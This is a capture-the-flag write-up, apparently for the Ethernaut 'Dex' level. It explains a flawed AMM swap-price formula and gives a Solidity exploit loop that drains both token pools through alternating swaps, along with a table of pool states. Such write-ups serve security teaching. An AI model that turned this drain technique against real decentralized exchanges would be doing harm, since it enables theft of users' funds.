# Level 22: Dex

**Target:** [Dex.sol](./Dex.sol)
**Exploit:** [exploit.sol](./exploit.sol)

## Vulnerability

Flawed AMM pricing formula. `getSwapPrice` computes output using only the current pool reserves, without accounting for the incoming tokens changing those reserves mid-swap. Repeated swaps in alternating directions (ping-pong) amplify rounding errors and progressively drain the pool.

## Key Concepts

**The broken formula:**
```solidity
return (amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this));
```

This is evaluated *before* the `from` tokens are added to the pool. In a correct constant-product AMM (e.g., Uniswap V2), the formula would account for the new reserve state after deposit. Here, the denominator (`from` reserve) is understated, so the output (`to` tokens) is overstated — the attacker receives more than the mathematically fair amount.

**Slippage compounding:** Each swap tilts the pool further. The ratio `to_reserve / from_reserve` becomes increasingly skewed with every iteration, growing the attacker's position super-linearly.

**Swap 6 edge case:** On the final swap, the full balance would mathematically yield more than the remaining pool contains. The exploit detects this (`if actualBalanceTarget < calcSwapPrice`) and caps the input to exactly the amount needed to drain the pool:
```solidity
amount = IExploit(from).balanceOf(target); // drain exactly what's left
```

## Exploit

On-chain bot contract that:
1. Pulls player's tokens into itself via `transferFrom`
2. Approves the DEX with `type(uint256).max`
3. Loops while both pool reserves are > 0, alternating `token1 → token2` and `token2 → token1`
4. On the last swap, caps `amount` to avoid exceeding pool reserves

```solidity
while(IExploit(token1).balanceOf(target) > 0 && IExploit(token2).balanceOf(target) > 0) {
    from = isToken1 ? token1 : token2;
    to   = isToken1 ? token2 : token1;
    amount = IExploit(from).balanceOf(address(this));

    if (IExploit(target).getSwapPrice(from, to, amount) > IExploit(to).balanceOf(target)) {
        amount = IExploit(from).balanceOf(target); // cap to drain remainder
    }

    IExploit(target).swap(from, to, amount);
    isToken1 = !isToken1;
}
```

Pool state across 6 swaps (starting: 100 T1 / 100 T2 each side):

| Swap | Direction | Amount In | Amount Out | Pool T1 | Pool T2 |
|------|-----------|-----------|------------|---------|---------|
| 1 | T1→T2 | 10 | 10 | 110 | 90 |
| 2 | T2→T1 | 20 | 24 | 86 | 110 |
| 3 | T1→T2 | 24 | 30 | 110 | 80 |
| 4 | T2→T1 | 30 | 41 | 69 | 110 |
| 5 | T1→T2 | 41 | 65 | 110 | 45 |
| 6 | T2→T1 | 45 | 110 | **0** | 90 |

## Root Cause

The swap formula uses stale reserve values — it reads balances before the incoming tokens are deposited. A correct implementation (Uniswap V2 style) would use `reserve_in + amount_in` as the denominator, preventing the attacker from exploiting the pre-deposit ratio.

## Real-World Reference

Price manipulation via flawed AMM math is a recurring attack vector. The **Saddle Finance hack (2022, $10M)** exploited incorrect handling of metapool virtual prices — the attacker manipulated the rate between assets by performing large swaps that distorted the on-chain price reading used by the protocol's own contracts, draining funds through a sequence of swaps and withdrawals.
